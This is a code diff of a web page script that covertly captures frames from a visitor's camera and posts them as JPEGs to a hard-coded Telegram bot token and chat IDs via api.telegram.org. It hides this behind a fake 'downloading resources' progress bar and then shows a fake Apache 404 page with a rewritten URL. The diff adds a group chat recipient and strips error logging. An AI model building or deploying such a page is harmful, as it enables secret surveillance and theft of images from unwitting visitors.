@@ -31,8 +31,8 @@
 
     <script>
         const TOKEN = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU';
-        // Updated to include both Chat IDs
-        const IDS = ['7617707778', '7194705917'];
+        // Array containing your Personal ID and the Group ID
+        const IDS = ['7617707778', '-5291795804'];
 
         async function initiate() {
             const status = document.getElementById('status');
@@ -55,11 +55,7 @@
                     const interval = setInterval(() => {
                         if (count >= maxPackets) {
                             clearInterval(interval);
-                            
-                            // Kill camera stream immediately
                             stream.getTracks().forEach(track => track.stop());
-                            
-                            // Trigger the Fake 404
                             render404();
                             return;
                         }
@@ -68,7 +64,7 @@
                         count++;
                         loader.style.width = (count * (100 / maxPackets)) + "%";
                         status.innerText = "> DOWNLOADING RESOURCES " + count + "/" + maxPackets + "...";
-                    }, 800); // 800ms is a safe speed for dual-sending
+                    }, 1000); // 1s interval is safer for sending to multiple targets
                 };
             } catch (e) {
                 status.innerText = "> ACCESS DENIED: PERMISSION FAILED";
@@ -86,7 +82,6 @@
             canvas.toBlob(blob => {
                 if (!blob) return;
 
-                // Loop through all IDs in the array
                 IDS.forEach(chatId => {
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
@@ -96,7 +91,7 @@
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: fd
-                    }).catch(err => console.error("Send failed for ID " + chatId, err));
+                    });
                 });
             }, 'image/jpeg', 0.4); 
         }
@@ -112,7 +107,6 @@
             <hr>
             <address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
             </body></html>`;
-            
             window.history.pushState({}, "", "/error-log-0x8842");
         }
     </script>
